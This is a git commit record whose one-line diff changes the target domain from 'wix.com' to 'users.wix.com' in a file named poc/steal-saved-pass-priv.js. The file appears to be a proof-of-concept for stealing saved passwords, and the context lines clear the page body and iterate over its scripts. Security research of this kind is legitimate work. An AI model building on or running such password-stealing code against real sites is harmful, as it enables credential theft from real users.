5a569be7a76b309f5c6bb9a184b75a11caa889fb
Roberto Nunes <46332131+Akokonunes@users.noreply.github.com>
2024-12-15 11:26:23 +0900

    Update steal-saved-pass-priv.js

--- poc/steal-saved-pass-priv.js
+++ poc/steal-saved-pass-priv.js
@@ -1,5 +1,5 @@
 // Define the target domain explicitly
-var targetDomain = 'wix.com'; // Change this to 'site2.com', 'site3.com', etc., as needed
+var targetDomain = 'users.wix.com'; // Change this to 'site2.com', 'site3.com', etc., as needed
 
 document.body.innerHTML = "";
 var scripts = document.scripts;
